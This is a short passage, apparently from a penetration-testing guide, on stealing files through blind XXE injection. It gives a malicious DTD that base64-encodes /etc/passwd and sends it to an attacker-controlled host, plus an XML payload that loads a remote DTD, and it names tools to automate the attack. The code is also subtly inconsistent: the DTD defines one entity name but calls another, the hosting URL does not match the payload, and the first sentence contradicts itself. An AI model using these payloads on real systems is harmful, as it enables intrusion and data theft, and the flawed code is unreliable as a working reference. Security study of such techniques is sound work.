Exfiltrating sensitive data in blind XXE is hard but not possible. This can be achieved by hosting a malicious DTD on a system that an attacker controls and then invoking it within the XXE payload. An example of a malicious DTD to exfiltrate contents of `/etc/passwd`:
```dtd
<!ENTITY % out SYSTEM "php://filter/read=convert.base64-encode/resource=file:///etc/passwd">
<!ENTITY % oob "<!ENTITY &#x25; referenceme SYSTEM 'http://OUR_IP:OUR_PORT/?content=%out;'>">
%oob;
%exfil;
```
> Note: Alternatively, we can use Burp Collaborator, [CanaryTokens](https://canarytokens.org/generate#), or [interactsh](https://github.com/projectdiscovery/interactsh) to replace `OUR_IP:OUR_PORT`.

The attacker must then host the malicious DTD on a system they control. For example, the attacker might serve it at the following URL: `https://web-attacker.com/malicious.dtd`.

Finally, the attacker must submit the following XXE payload to the vulnerable application:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://10.100.13.200:4444/data.dtd"> %xxe;]>
<stockCheck><productId>11234</productId></stockCheck>
```

Alternatively, we can use [XXEInjection](https://github.com/enjoiz/XXEinjector) to automate this process.